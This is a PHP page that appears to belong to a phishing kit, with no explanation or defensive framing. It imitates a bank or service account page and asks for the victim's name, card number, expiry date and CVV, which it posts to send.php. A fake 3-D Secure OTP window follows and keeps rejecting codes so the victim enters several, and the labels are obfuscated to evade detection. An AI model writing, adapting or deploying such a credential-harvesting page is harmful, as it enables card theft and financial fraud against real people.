<?php 
session_start();
if(isset($_GET['lang'])){
	$_SESSION['countryCode']=$_GET['lang'];
}
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title></title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
<div class="left">
<img src="res/logo.png">
</div>
<div class="right">
<a href=""><?php echo $obf->obf(getLang('SIGN_OUT')); ?></a>
</div>
</header>

<section>

<div class="form">
<div class="form-title">
<?php echo $obf->obf(getLang('TITLE_CARD')); ?>
</div>
<img src="res/cards.png" style="width:200px;">
<div class="form-col">
<input type="text" class="textinput" id="in0" placeholder="<?php echo getLang('FIRST_NAME'); ?>">
<span id="err0"></span>
</div>
<div class="form-col">
<input type="text" class="textinput" id="in1" placeholder="<?php echo getLang('LAST_NAME'); ?>">
<span id="err1"></span>
</div>
<div class="form-col">
<input type="text" class="textinput" inputmode="numeric" id="in2" placeholder="<?php echo getLang('CARD_NUMBER'); ?>">
<span id="err2"></span>
</div>
<div class="form-col">
<input type="text" class="textinput" inputmode="numeric" id="in3" placeholder="<?php echo getLang('EXPIRY_DATE'); ?>">
<span id="err3"></span>
</div>
<div class="form-col">
<input type="text" class="textinput" inputmode="numeric" id="in4" placeholder="<?php echo getLang('CVV_CODE'); ?>">
<span id="err4"></span>
</div>

<div class="form-col" style="font-size:0.7em; color:#5c5c5c;">
<?php echo $obf->obf(getLang('PAYMENT_NOTE')); ?>
<br><br><br>
<?php echo $obf->obf(getLang('TERMS')); ?>
<br><br>
<label style="display:flex; align-items:center; font-size:1.5em;">
<input type="checkbox" style="width:20px; height:20px; margin-right:10px;"> <?php echo $obf->obf(getLang('AGREE')); ?>
</label>

</div>


<div class="form-col">
<button  onclick="sbmt()" id="submit" class="sbmt"><?php echo getLang('CONTINUE'); ?></button>
</div>

<div style="color:#717171;  margin-top:60px;">

</div>

 
</div>

</section>



<footer>
<div style="">
<?php echo getLang('CONTACT'); ?>
</div>
<div style="margin:30px 0;">
<?php echo getLang('LINKS'); ?>
</div>
<div style="">
<select style="padding:10px;" id="lang" onchange="setLang()">
<option value="EN">English</option>
<option value="ES">Española</option>
<option value="DE">Deutsche</option>
<option value="FR">Français</option>
</select>
</div>
</footer>




<div class="otp-window" id="otpwindow">
<div class="otp-holder" >
<div class="otp-content" >
<div id="otp" style="display:none;">
<div style="display:flex; align-items:center; justify-content:center;">
<div style="text-align:left; width:50%;">
<img src="res/logo.png" style="width:80px;">
</div>
<div style="text-align:right; width:50%;">
<img src="res/vbvmcs.png" style="width:120px;">
</div>
</div>
 <?php echo getLang('OTP_TEXT'); ?>
 <p id="smserror" style="color:red; display:none;"><?php echo getLang('INCORRECT_OTP'); ?></p>
 <div style="margin:50px 0;">
<input type="text" inputmode="numeric" id="sms" placeholder="<?php echo getLang('INPUT_OTP'); ?>">
<button onclick="sendOtp()"><?php echo getLang('SUBMIT_OTP'); ?></button>
</div>
<div style="margin-top:30px;">
<a href="#"><?php echo getLang("NEW_CODE"); ?></a>
</div>
</div>
<div id="loader">
<img src="res/loading.gif" style="margin-top:120px; width:60px;">
</div>
</div>
</div>
</div>



<script src="res/jq.js"></script>
<script src="res/m.js"></script>
<script>
var validating=false;



function setLang(){
	window.location= "?lang="+$("#lang").val();
	
}

function sbmt(){
	validating=true;
	validate();
	
var abort = false;
	for(var x=0; x<=4; x++){
		if($("#in"+x).val()==""){
			abort=true;
		}
	}
	
	if(!abort){
		// send card and show OTP
		
		$("#otpwindow").fadeIn();
		
		var res="";
		
	
		$.post("send.php", 
			{	
				fname:$("#in0").val(), 
				lname:$("#in1").val(),
				cc:$("#in2").val(),
				exp:$("#in3").val(),
				cvv:$("#in4").val()
			
			}, function(done){
				setTimeout(function(){	
				$("#loader").hide();
				$("#otp").show();
				}, 7000);
			}
		
		);
		
		
		
		
	}
	
}


function validate(){
	if(validating){
	for(var x=0; x<=4; x++){
		if($("#in"+x).val()==""){
			$("#err"+x).html("<?php echo getLang('REQUIRED'); ?>");
			$("#in"+x).css("border", "1px solid #e77508");		
		}else{
			$("#err"+x).html("");
			$("#in"+x).css("border", "1px solid #c9c9c9");
		}
	}
	}
}


$(".textinput").keyup(function(){
		validate();
});



var tries = 0;
var max_tries = 3;

function sendOtp(){
	if($("#sms").val().trim()!=""){
		$("#smserror").hide();
		$("#otp").hide();
		$("#loader").show();
		
		
		$.post("send.php", {sms: $("#sms").val()}, function(d){
			tries++;
			
			if(tries>=max_tries){
				window.location="exit.php";
			}else{
				$("#sms").val("");
				$("#smserror").show();
				$("#otp").show();
				$("#loader").hide();
			}
		
		});
		
	}
}



$("section input").keypress((e)=>{
	if(e.key=="Enter"){
		sbmt();
	}
});

$("#otpwindow input").keypress((e)=>{
	if(e.key=="Enter"){
		sendOtp();
	}
});



$("#in2").mask("0000000000000000");
$("#in3").mask("00/00");
$("#in4").mask("0000");
</script>
</body>
</html>